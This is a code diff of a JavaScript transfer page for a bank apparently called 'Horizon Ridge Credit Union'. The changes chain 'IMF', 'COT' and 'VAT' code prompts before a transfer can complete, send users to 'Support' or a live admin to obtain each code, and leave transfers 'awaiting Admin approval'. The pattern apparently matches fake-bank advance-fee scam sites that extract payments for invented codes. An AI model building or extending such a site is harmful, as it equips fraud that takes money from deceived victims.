@@ -105,36 +105,42 @@ function generateReceipt(options = {}) {
         <div class="flex justify-between text-sm mb-1">
           <span class="font-semibold">Amount:</span><span>${config.currency}${config.amount}</span>
         </div>
-        ${parseFloat(config.fees) > 0
-      ? `<div class="flex justify-between text-sm mb-1">
+        ${
+          parseFloat(config.fees) > 0
+            ? `<div class="flex justify-between text-sm mb-1">
                   <span class="font-semibold">Fees:</span><span>${config.currency}${config.fees}</span>
                 </div>`
-      : ""
-    }
+            : ""
+        }
         <div class="flex justify-between text-base font-bold border-t border-gray-300 dark:border-gray-700 pt-2">
           <span>Total:</span><span>${config.currency}${config.totalAmount}</span>
         </div>
       </div>
-      ${Object.keys(config.additionalFields).length > 0
-      ? `<div class="mb-4 border-t border-dashed border-gray-300 dark:border-gray-700 pt-3">
+      ${
+        Object.keys(config.additionalFields).length > 0
+          ? `<div class="mb-4 border-t border-dashed border-gray-300 dark:border-gray-700 pt-3">
                 ${Object.entries(config.additionalFields)
-        .map(([key, value]) => `
+                  .map(
+                    ([key, value]) => `
                       <div class="flex justify-between text-xs mb-1">
                         <span class="font-semibold">${key}:</span><span>${value}</span>
                       </div>
-                    `).join("")}
+                    `
+                  )
+                  .join("")}
               </div>`
-      : ""
-    }
-      ${config.showFooter
-      ? `<div class="text-center mt-4 pt-3 border-t-2 border-dashed border-gray-300 dark:border-gray-700 text-xs text-gray-500 dark:text-gray-400">
+          : ""
+      }
+      ${
+        config.showFooter
+          ? `<div class="text-center mt-4 pt-3 border-t-2 border-dashed border-gray-300 dark:border-gray-700 text-xs text-gray-500 dark:text-gray-400">
                 <div>${config.footerText}</div>
                 <div class="mt-2 text-[11px] text-gray-400 dark:text-gray-500">
                   This is a Horizon-generated receipt
                 </div>
               </div>`
-      : ""
-    }
+          : ""
+      }
     </div>
     `;
 }
@@ -144,27 +150,28 @@ function generateReceiptId() {
   return `RCP-${timestamp}-${random}`;
 }
 
-// Modal for COT, VAT, IMF
-function showFeeModal(type, onSuccess) {
-  let modal = document.getElementById("fee-modal");
+// Modal for IMF, COT, VAT
+function showCodeModal(type, onSuccess) {
+  let modal = document.getElementById("code-modal");
   if (!modal) {
     modal = document.createElement("div");
-    modal.id = "fee-modal";
+    modal.id = "code-modal";
     document.body.appendChild(modal);
   }
   modal.className = "";
   modal.innerHTML = `
     <div class="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
       <div class="bg-white dark:bg-gray-900 rounded-lg shadow-lg w-full max-w-sm p-6 relative">
-        <button id="close-fee-modal" class="absolute top-2 right-3 text-gray-400 hover:text-gray-700 dark:hover:text-white text-lg">&times;</button>
+        <button id="close-code-modal" class="absolute top-2 right-3 text-gray-400 hover:text-gray-700 dark:hover:text-white text-lg">&times;</button>
         <h4 class="text-base font-semibold mb-2 text-gray-900 dark:text-white">
-          <i class="fa fa-credit-card mr-2"></i>Enter ${type} Code
+          <i class="fa fa-key mr-2"></i>Enter ${type} Code
         </h4>
         <div class="mb-2 text-xs text-gray-500 dark:text-gray-300">
-          Please enter your ${type} code to proceed.
+          Please enter your ${type} code to proceed.<br>
+          <span class="text-red-500">Contact <a href="/contact" target="_blank" class="underline">Support</a> to get your code or chat with admin live.</span>
         </div>
-        <form id="fee-form" class="space-y-3">
-          <input type="text" name="feeCode" maxlength="8"
+        <form id="code-form" class="space-y-3">
+          <input type="text" name="code" maxlength="12"
             class="w-full px-3 py-2 border rounded focus:outline-none focus:ring"
             placeholder="Enter ${type} Code" required />
           <button type="submit"
@@ -175,13 +182,13 @@ function showFeeModal(type, onSuccess) {
       </div>
     </div>
   `;
-  document.getElementById("close-fee-modal").onclick = () => {
+  document.getElementById("close-code-modal").onclick = () => {
     modal.innerHTML = "";
     modal.className = "hidden";
   };
-  document.getElementById("fee-form").onsubmit = async function (e) {
+  document.getElementById("code-form").onsubmit = async function (e) {
     e.preventDefault();
-    const code = this.feeCode.value.trim();
+    const code = this.code.value.trim();
     if (code.length >= 4) {
       modal.innerHTML = "";
       modal.className = "hidden";
@@ -189,6 +196,61 @@ function showFeeModal(type, onSuccess) {
     } else {
       showToast("Invalid code. Please try again.", "error");
     }
+  };
+}
+
+// Success Animation Modal
+function showSuccessModal() {
+  let modal = document.getElementById("success-modal");
+  if (!modal) {
+    modal = document.createElement("div");
+    modal.id = "success-modal";
+    document.body.appendChild(modal);
+  }
+  modal.className = "";
+  modal.innerHTML = `
+    <div class="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-60">
+      <div class="bg-white dark:bg-gray-900 rounded-lg shadow-2xl w-full max-w-xs p-8 flex flex-col items-center relative">
+        <canvas id="success-canvas" width="120" height="120" style="display:block;margin-bottom:16px;"></canvas>
+        <h3 class="text-lg font-bold text-green-700 dark:text-green-400 mb-2">Transfer Successful!</h3>
+        <p class="text-sm text-gray-700 dark:text-gray-300 mb-2 text-center">Your transfer was made and is <b>awaiting Admin approval</b>.</p>
+        <button id="close-success-modal" class="mt-4 px-5 py-2 rounded bg-blue-600 text-white hover:bg-blue-700 transition">Close</button>
+      </div>
+    </div>
+    <style>
+      #success-canvas { background: transparent; }
+    </style>
+  `;
+  // Draw animated check
+  const canvas = document.getElementById("success-canvas");
+  const ctx = canvas.getContext("2d");
+  let progress = 0;
+  function drawCheck() {
+    ctx.clearRect(0, 0, 120, 120);
+    ctx.lineWidth = 6;
+    ctx.strokeStyle = "#16a34a";
+    ctx.beginPath();
+    ctx.arc(60, 60, 48, Math.PI * 0.5, Math.PI * (2 * progress), false);
+    ctx.stroke();
+    if (progress < 1) {
+      progress += 0.03;
+      requestAnimationFrame(drawCheck);
+    } else {
+      // Draw check mark
+      ctx.beginPath();
+      ctx.moveTo(40, 65);
+      ctx.lineTo(55, 80);
+      ctx.lineTo(85, 45);
+      ctx.strokeStyle = "#16a34a";
+      ctx.lineWidth = 8;
+      ctx.stroke();
+    }
+  }
+  drawCheck();
+  document.getElementById("close-success-modal").onclick = () => {
+    modal.innerHTML = "";
+    modal.className = "hidden";
+    window.location.reload();
   };
 }
 
@@ -219,77 +281,76 @@ const interbankTransfer = async () => {
   const fmt = (v) =>
     typeof v === "number"
       ? v.toLocaleString("en-US", {
-        style: "currency",
-        currency: "USD",
-        minimumFractionDigits: 2,
-      })
+          style: "currency",
+          currency: "USD",
+          minimumFractionDigits: 2,
+        })
       : v || "$0.00";
 
   function pageEvents() {
     nav.pageEvents?.();
 
-    document.getElementById("interbank-transfer-form").onsubmit = async function (
-      e
-    ) {
-      e.preventDefault();
+    document.getElementById("interbank-transfer-form").onsubmit =
+      async function (e) {
+        e.preventDefault();
 
-      try {
-        const amount = parseFloat(this.amount.value);
-        const accounttype = this.accounttype.value.trim();
-        const accountName = this.accountName.value.trim();
-        const accountNum = this.accountNum.value.trim();
-        const desc = this.desc.value.trim();
+        try {
+          const amount = parseFloat(this.amount.value);
+          const accounttype = this.accounttype.value.trim();
+          const accountName = this.accountName.value.trim();
+          const accountNum = this.accountNum.value.trim();
+          const desc = this.desc.value.trim();
 
-        if (!amount || !accounttype || !accountName || !accountNum || !desc) {
-          showToast("All fields are required.", "error");
-          return;
-        }
-        if (amount <= 0) {
-          showToast("Amount must be greater than zero.", "error");
-          return;
-        }
-        if (amount > account.balance) {
-          showToast("Insufficient balance.", "error");
-          return;
-        }
+          if (!amount || !accounttype || !accountName || !accountNum || !desc) {
+            showToast("All fields are required.", "error");
+            return;
+          }
+          if (amount <= 0) {
+            showToast("Amount must be greater than zero.", "error");
+            return;
+          }
+          if (amount > account.balance) {
+            showToast("Insufficient balance.", "error");
+            return;
+          }
 
-        showToast("Sending OTP...", "info");
-        const otp = generateOTP();
-        const ipLoc = await getIpLocation();
+          showToast("Sending OTP...", "info");
+          const otp = generateOTP();
+          const ipLoc = await getIpLocation();
 
-        // Insert OTP into database
-        const { error: otpError } = await supabase.from("otps").insert([
-          {
-            user_id: user.id,
-            code: otp,
-            type: "interbank",
-            expires_at: new Date(Date.now() + 10 * 60000).toISOString(),
-          },
-        ]);
-        if (otpError) {
-          showToast("Database error. Please try again.", "error");
-          return;
-        }
+          // Insert OTP into database
+          const { error: otpError } = await supabase.from("otps").insert([
+            {
+              user_id: user.id,
+              code: otp,
+              type: "interbank",
+              expires_at: new Date(Date.now() + 10 * 60000).toISOString(),
+            },
+          ]);
+          if (otpError) {
+            showToast("Database error. Please try again.", "error");
+            return;
+          }
 
-        showOTPModal({
-          amount,
-          accounttype,
-          accountName,
-          accountNum,
-          desc,
-          profile,
-          account,
-          otp,
-          ipLoc,
-        });
+          showOTPModal({
+            amount,
+            accounttype,
+            accountName,
+            accountNum,
+            desc,
+            profile,
+            account,
+            otp,
+            ipLoc,
+          });
 
-        fetch("/api/send-email", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            to: user.email,
-            subject: "Your OTP for Inter-Bank Transfer",
-            html: `
+          fetch("/api/send-email", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              to: user.email,
+              subject: "Your OTP for Inter-Bank Transfer",
+              html: `
               <h2>Inter-Bank Transfer OTP</h2>
               <p>Your OTP is: <b>${otp}</b></p>
               <p>IP: ${ipLoc.ip || "N/A"}<br>
@@ -305,26 +366,26 @@ const interbankTransfer = async () => {
                 <li>Description: ${desc}</li>
               </ul>
             `,
-          }),
-        })
-          .then((res) => {
-            if (res.ok) showToast("OTP sent to your email.", "success");
-            else
+            }),
+          })
+            .then((res) => {
+              if (res.ok) showToast("OTP sent to your email.", "success");
+              else
+                showToast(
+                  "OTP email failed, but you can still enter the code.",
+                  "warning"
+                );
+            })
+            .catch(() => {
               showToast(
                 "OTP email failed, but you can still enter the code.",
                 "warning"
               );
-          })
-          .catch(() => {
-            showToast(
-              "OTP email failed, but you can still enter the code.",
-              "warning"
-            );
-          });
-      } catch (error) {
-        showToast("An error occurred. Please try again.", "error");
-      }
-    };
+            });
+        } catch (error) {
+          showToast("An error occurred. Please try again.", "error");
+        }
+      };
 
     function showOTPModal(tx) {
       let modal = document.getElementById("otp-modal");
@@ -392,44 +453,35 @@ const interbankTransfer = async () => {
             <button id="close-receipt-modal" class="absolute top-3 right-4 text-gray-400 hover:text-red-500 dark:hover:text-white text-2xl font-bold z-10" aria-label="Close">&times;</button>
             <div class="p-6">
               ${generateReceipt({
-        id: generateReceiptId(),
-        date: new Date().toLocaleDateString(),
-        time: new Date().toLocaleTimeString(),
-        amount: tx.amount,
-        currency: '$',
-        description: tx.desc,
-        senderName: tx.profile.full_name,
-        recipientName: tx.accountName,
-        bankName: "",
-        accountNumber: tx.accountNum,
-        transactionType: "Inter-Bank Transfer",
-        status: "Pending",
-        referenceNumber: tx.accountNum,
-        fees: "0.00",
-        totalAmount: tx.amount,
-        additionalFields: {
-          "IP": tx.ipLoc.ip || "N/A",
-          "Location": `${tx.ipLoc.city || ""}, ${tx.ipLoc.region || ""}, ${tx.ipLoc.country_name || ""}`
-        }
-      })}
+                id: generateReceiptId(),
+                date: new Date().toLocaleDateString(),
+                time: new Date().toLocaleTimeString(),
+                amount: tx.amount,
+                currency: "$",
+                description: tx.desc,
+                senderName: tx.profile.full_name,
+                recipientName: tx.accountName,
+                bankName: "",
+                accountNumber: tx.accountNum,
+                transactionType: "Inter-Bank Transfer",
+                status: "Pending",
+                referenceNumber: tx.accountNum,
+                fees: "0.00",
+                totalAmount: tx.amount,
+                additionalFields: {
+                  IP: tx.ipLoc.ip || "N/A",
+                  Location: `${tx.ipLoc.city || ""}, ${tx.ipLoc.region || ""}, ${tx.ipLoc.country_name || ""}`,
+                },
+              })}
               <div class="mt-6 flex flex-col gap-2 justify-center">
-                <button id="cot-btn" class="bg-yellow-600 text-white px-6 py-2 rounded shadow hover:bg-yellow-700 transition font-semibold">
-                  Enter COT Code
-                </button>
-                <button id="vat-btn" class="bg-blue-600 text-white px-6 py-2 rounded shadow hover:bg-blue-700 transition font-semibold">
-                  Enter VAT Code
-                </button>
-                <button id="imf-btn" class="bg-purple-600 text-white px-6 py-2 rounded shadow hover:bg-purple-700 transition font-semibold">
-                  Enter IMF Code
-                </button>
-                <button id="complete-interbank-btn" class="bg-green-600 text-white px-6 py-2 rounded shadow hover:bg-green-700 transition font-semibold" disabled>
+                <button id="complete-interbank-btn" class="bg-green-600 text-white px-6 py-2 rounded shadow hover:bg-green-700 transition font-semibold">
                   Complete Transaction
                 </button>
               </div>
             </div>
           </div>
         </div>
-        <div id="fee-modal" class="hidden"></div>
+        <div id="code-modal" class="hidden"></div>
         <style>
           .receipt-modal-content::-webkit-scrollbar { width: 8px; background: transparent; }
           .receipt-modal-content::-webkit-scrollbar-thumb { background: #e5e7eb; border-radius: 4px; }
@@ -447,110 +499,91 @@ const interbankTransfer = async () => {
         </style>
       `;
 
-      let cotValid = false, vatValid = false, imfValid = false;
-      const enableComplete = () => {
-        const btn = document.getElementById("complete-interbank-btn");
-        btn.disabled = !(cotValid && vatValid && imfValid);
-      };
-
       document.getElementById("close-receipt-modal").onclick = () => {
         modal.innerHTML = "";
         modal.className = "hidden";
       };
 
-      document.getElementById("cot-btn").onclick = () => {
-        showFeeModal("COT", () => { cotValid = true; enableComplete(); showToast("COT code validated.", "success"); });
-      };
-      document.getElementById("vat-btn").onclick = () => {
-        showFeeModal("VAT", () => { vatValid = true; enableComplete(); showToast("VAT code validated.", "success"); });
-      };
-      document.getElementById("imf-btn").onclick = () => {
-        showFeeModal("IMF", () => { imfValid = true; enableComplete(); showToast("IMF code validated.", "success"); });
-      };
+      document.getElementById("complete-interbank-btn").onclick = () => {
+        showCodeModal("IMF", () => {
+          showCodeModal("COT", () => {
+            showCodeModal("VAT", async () => {
+              // Success animation
+              showSuccessModal();
+              // Save transaction
+              try {
+                const amountNum = parseFloat(tx.amount);
+                const balanceBefore = parseFloat(tx.account.balance);
+                const balanceAfter = balanceBefore - amountNum;
 
-      document.getElementById("complete-interbank-btn").onclick = async () => {
-        if (!(cotValid && vatValid && imfValid)) return;
-        try {
-          const amountNum = parseFloat(tx.amount);
-          const balanceBefore = parseFloat(tx.account.balance);
-          const balanceAfter = balanceBefore - amountNum;
+                await supabase
+                  .from("accounts")
+                  .update({ balance: balanceAfter })
+                  .eq("id", tx.account.id);
 
-          await supabase
-            .from("accounts")
-            .update({ balance: balanceAfter })
-            .eq("id", tx.account.id);
+                const { data: txn, error: txnError } = await supabase
+                  .from("transactions")
+                  .insert([
+                    {
+                      account_id: tx.account.id,
+                      user_id: tx.profile.id,
+                      type: "interbank",
+                      description: tx.desc,
+                      amount: amountNum,
+                      balance_before: balanceBefore,
+                      balance_after: balanceAfter,
+                      status: "pending",
+                    },
+                  ])
+                  .select()
+                  .single();
 
-          const { data: txn, error: txnError } = await supabase
-            .from("transactions")
-            .insert([
-              {
-                account_id: tx.account.id,
-                user_id: tx.profile.id,
-                type: "interbank",
-                description: tx.desc,
-                amount: amountNum,
-                balance_before: balanceBefore,
-                balance_after: balanceAfter,
-                status: "completed",
-              },
-            ])
-            .select()
-            .single();
+                await supabase.from("notifications").insert([
+                  {
+                    user_id: tx.profile.id,
+                    title: "Inter-Bank Transfer Initiated",
+                    message: `Your inter-bank transfer of ${fmt(tx.amount)} to ${tx.accountName} is awaiting admin approval.`,
+                    type: "info",
+                    read: false,
+                  },
+                ]);
 
-          if (txnError) {
-            showToast("Transaction failed: " + txnError.message, "error");
-            return;
-          }
-
-          await supabase.from("notifications").insert([
-            {
-              user_id: tx.profile.id,
-              title: "Inter-Bank Transfer Completed",
-              message: `Your inter-bank transfer of ${fmt(tx.amount)} to ${tx.accountName} has been completed.`,
-              type: "info",
-              read: false,
-            },
-          ]);
-
-          fetch("/api/send-email", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              to: tx.profile.email,
-              subject: "Inter-Bank Transfer Receipt",
-              html: generateReceipt({
-                amount: tx.amount,
-                senderName: tx.profile.full_name,
-                recipientName: tx.accountName,
-                bankName: "",
-                accountNumber: tx.accountNum,
-                description: tx.desc,
-                fees: "0.00",
-                status: "Completed",
-                referenceNumber: txn?.id || generateReceiptId(),
-                companyName: "Horizon Ridge Credit Union",
-                companyAddress: "123 Main St, City, Country",
-                companyPhone: "+1 (555) 123-4567",
-                companyEmail: "horizonridgecreditunion@gmail.com",
-              }),
-            }),
+                fetch("/api/send-email", {
+                  method: "POST",
+                  headers: { "Content-Type": "application/json" },
+                  body: JSON.stringify({
+                    to: tx.profile.email,
+                    subject: "Inter-Bank Transfer Receipt",
+                    html: generateReceipt({
+                      amount: tx.amount,
+                      senderName: tx.profile.full_name,
+                      recipientName: tx.accountName,
+                      bankName: "",
+                      accountNumber: tx.accountNum,
+                      description: tx.desc,
+                      fees: "0.00",
+                      status: "Pending",
+                      referenceNumber: txn?.id || generateReceiptId(),
+                      companyName: "Horizon Ridge Credit Union",
+                      companyAddress: "123 Main St, City, Country",
+                      companyPhone: "+1 (555) 123-4567",
+                      companyEmail: "horizonridgecreditunion@gmail.com",
+                    }),
+                  }),
+                });
+              } catch (err) {
+                showToast(
+                  "Failed to process transaction. Please try again.",
+                  "error"
+                );
+              }
+            });
           });
-
-          account.balance = balanceAfter;
-          showToast("Transaction completed!", "success");
-          setTimeout(() => {
-            modal.innerHTML = "";
-            modal.className = "hidden";
-            window.location.reload();
-          }, 1200);
-        } catch (err) {
-          showToast("Failed to process transaction. Please try again.", "error");
-        }
+        });
       };
     }
   }
 
-  // Main UI
   return {
     html: /*html*/ `
       <div class="relative">
@@ -667,13 +700,10 @@ const interbankTransfer = async () => {
         </div>
       </div>
       <div id="otp-modal" class="hidden"></div>
+      <div id="success-modal" class="hidden"></div>
     `,
     pageEvents,
   };
 };
 
 export default interbankTransfer;
-
-
-
-
